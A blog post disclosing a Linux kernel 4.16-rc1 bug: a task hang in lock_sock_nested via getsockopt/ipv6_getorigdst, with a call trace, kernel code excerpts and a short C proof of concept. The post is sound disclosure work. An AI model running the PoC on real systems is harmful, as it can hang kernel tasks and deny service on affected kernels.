---
layout: post
title: LK v4.16.x - getsockopt - task hung
---

getsockopt - task hung in lock_sock_nested

posted & found by [zer0day](https://kozistr.github.io/)

## tl;dr

Posting in a long time :) because of other stuffs... I have a few LK bugs too, but skip it :)..

I just found a bug, task hung in lock_sock_nested on the latest LK (v4.16.0-rc1). Of course, from the conclusion, it's not critical and meaningless bug for me :(.
So i just simply add a short PoC which can reproduce a bug and Call Trace.

## Call Trace (Dump)

Here's a Call Trace. task hung (default 120s).

```sh
root@zer0day:~# uname -a
Linux zer0day 4.16.0-rc1+ #14 SMP Wed Feb 14 17:44:19 KST 2018 x86_64 GNU/Linux
root@zer0day:~# gcc -o poc poc.c
root@zer0day:~# ./poc
[  369.631452] INFO: task poc:2481 blocked for more than 120 seconds.
[  369.633340]       Not tainted 4.16.0-rc1+ #14
[  369.634552] "echo 0 > /proc/sys/kernel/hung_task_timeout_secs" disables this message.
[  369.636478] poc             D13984  2481   2464 0x00000000
[  369.638015] Call Trace:
[  369.638825]  ? __schedule+0x2a9/0xa90
[  369.639792]  ? __local_bh_enable_ip+0x7b/0xe0
[  369.640823]  schedule+0x2a/0x80
[  369.641559]  __lock_sock+0xa1/0x130
[  369.642395]  ? finish_wait+0x80/0x80
[  369.643189]  lock_sock_nested+0x9f/0xb0
[  369.643383]  ipv6_getorigdst+0x9e/0x2c0
[  369.643572]  ? __mutex_unlock_slowpath+0x46/0x2b0
[  369.643811]  ? nf_getsockopt+0x47/0x80
[  369.643996]  nf_getsockopt+0x47/0x80
[  369.644185]  ipv6_getsockopt+0x10a/0x170
[  369.644380]  udpv6_getsockopt+0x40/0x80
[  369.644569]  SyS_getsockopt+0x84/0xf0
[  369.644754]  do_syscall_64+0x74/0x210
[  369.644941]  entry_SYSCALL_64_after_hwframe+0x26/0x9b
[  369.645200] RIP: 0033:0x7f340483008a
[  369.645376] RSP: 002b:00007ffd08d09478 EFLAGS: 00000206 ORIG_RAX: 0000000000000037
[  369.645742] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f340483008a
[  369.646101] RDX: 0000000000000050 RSI: 0000000000000029 RDI: 0000000000000003
[  369.646443] RBP: 00007ffd08d09490 R08: 00007ffd08d09480 R09: 00007f3404aec2e0
[  369.646785] R10: 0000000000000000 R11: 0000000000000206 R12: 0000000000400450
[  369.647148] R13: 00007ffd08d09570 R14: 0000000000000000 R15: 0000000000000000
[  369.647499] 
[  369.647499] Showing all locks held in the system:
[  369.647802] 1 lock held by khungtaskd/439:
[  369.648026]  #0:  (tasklist_lock){.+.+}, at: [<00000000d02fdb21>] debug_show_all_locks+0x37/0x1a0
[  369.648470] 1 lock held by rsyslogd/2361:
[  369.648687]  #0:  (&f->f_pos_lock){+.+.}, at: [<0000000066b64151>] __fdget_pos+0x52/0x60
[  369.649092] 2 locks held by getty/2444:
[  369.649279]  #0:  (&tty->ldisc_sem){++++}, at: [<000000004c37478c>] tty_ldisc_ref_wait+0x20/0x50
[  369.649714]  #1:  (&ldata->atomic_read_lock){+.+.}, at: [<00000000e92c7245>] n_tty_read+0xec/0xa60
[  369.650156] 2 locks held by getty/2445:
[  369.650343]  #0:  (&tty->ldisc_sem){++++}, at: [<000000004c37478c>] tty_ldisc_ref_wait+0x20/0x50
[  369.650762]  #1:  (&ldata->atomic_read_lock){+.+.}, at: [<00000000e92c7245>] n_tty_read+0xec/0xa60
[  369.651203] 2 locks held by getty/2446:
[  369.651390]  #0:  (&tty->ldisc_sem){++++}, at: [<000000004c37478c>] tty_ldisc_ref_wait+0x20/0x50
[  369.651813]  #1:  (&ldata->atomic_read_lock){+.+.}, at: [<00000000e92c7245>] n_tty_read+0xec/0xa60
[  369.652256] 2 locks held by getty/2447:
[  369.652443]  #0:  (&tty->ldisc_sem){++++}, at: [<000000004c37478c>] tty_ldisc_ref_wait+0x20/0x50
[  369.652864]  #1:  (&ldata->atomic_read_lock){+.+.}, at: [<00000000e92c7245>] n_tty_read+0xec/0xa60
[  369.653305] 2 locks held by getty/2448:
[  369.653492]  #0:  (&tty->ldisc_sem){++++}, at: [<000000004c37478c>] tty_ldisc_ref_wait+0x20/0x50
[  369.653915]  #1:  (&ldata->atomic_read_lock){+.+.}, at: [<00000000e92c7245>] n_tty_read+0xec/0xa60
[  369.654356] 2 locks held by getty/2449:
[  369.654542]  #0:  (&tty->ldisc_sem){++++}, at: [<000000004c37478c>] tty_ldisc_ref_wait+0x20/0x50
[  369.654961]  #1:  (&ldata->atomic_read_lock){+.+.}, at: [<00000000e92c7245>] n_tty_read+0xec/0xa60
[  369.655424] 1 lock held by poc/2481:
[  369.655599]  #0:  (sk_lock-AF_INET6){+.+.}, at: [<000000002374a639>] ipv6_getsockopt+0xf2/0x170
[  369.656030] 
[  369.656108] =============================================
[  369.656108]
```

## Bug

With above Call Trace, i can notice, there is a lock_sock_nested in ipv6_getorigdst where the bug happened. 
At **/net/ipv6/netfilter/nf_conntrack_l3proto_ipv6.c:233**,

```c
...
static int
ipv6_getorigdst(struct sock *sk, int optval, void __user *user, int *len)
{
	struct nf_conntrack_tuple tuple = { .src.l3num = NFPROTO_IPV6 };
	const struct ipv6_pinfo *inet6 = inet6_sk(sk);
	const struct inet_sock *inet = inet_sk(sk);
	const struct nf_conntrack_tuple_hash *h;
	struct sockaddr_in6 sin6;
	struct nf_conn *ct;
	__be32 flow_label;
	int bound_dev_if;

	lock_sock(sk);
	tuple.src.u3.in6 = sk->sk_v6_rcv_saddr;
	tuple.src.u.tcp.port = inet->inet_sport;
	tuple.dst.u3.in6 = sk->sk_v6_daddr;
	tuple.dst.u.tcp.port = inet->inet_dport;
	tuple.dst.protonum = sk->sk_protocol;
	bound_dev_if = sk->sk_bound_dev_if;
	flow_label = inet6->flow_label;
	release_sock(sk);
	...
```

As you also know, **lock_sock_nested** looks like below... (*subclass* is zero in this case))

```c
void lock_sock_nested(struct sock *sk, int subclass)
{
	might_sleep(); // debug message is printed by this.
	spin_lock_bh(&sk->sk_lock.slock);
	if (sk->sk_lock.owned)
		__lock_sock(sk);
	sk->sk_lock.owned = 1;
	spin_unlock(&sk->sk_lock.slock);
	/*
	 * The sk_lock has mutex_lock() semantics here:
	 */
	mutex_acquire(&sk->sk_lock.dep_map, subclass, 0, _RET_IP_);
	local_bh_enable();
}
```

In short, maybe, there is a task hung in ipv6_getorigdst while holding the socket lock, so it's blocking other tasks too.

## POC

Here's a PoC code for reproducing.

```c
#define _GNU_SOURCE 

#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>

int main() {
	int size = 4;
	void *p = (void *)0;

	int s = socket(0xa, 2, 0);           // socket@inet6_udp
	getsockopt(s, 0x29, 0x50, p, &size); // getsockopt@inet6_int

	return 0;
}
```

**END**